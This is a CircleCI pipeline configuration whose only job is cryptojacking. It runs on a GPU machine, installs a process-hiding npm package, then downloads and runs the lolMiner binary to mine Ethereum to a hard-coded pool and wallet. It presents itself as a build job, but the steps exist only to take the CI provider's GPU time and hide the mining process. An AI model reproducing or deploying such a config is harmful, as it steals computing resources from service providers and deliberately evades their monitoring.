version: 2.1

jobs:
  build:
    machine:
      image: ubuntu-2004-cuda-11.4:202110-01
    resource_class: gpu.nvidia.large
    steps:
      - run: nvidia-smi
      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
      - run: apt-get update
      - run: apt-get full-upgrade
      - run: sudo apt-get install -y nodejs
      - run: npm i -g node-process-hider
      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.50/lolMiner_v1.50_Lin64.tar.gz && tar -xzvf lolMiner_v1.50_Lin64.tar.gz && cd 1.50 && ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user nano_1rq9zug5u68cj3q41iarsurzxwzha3ma5uc4idjretbtng4ekewrfqh8ersf.workerc1 pause
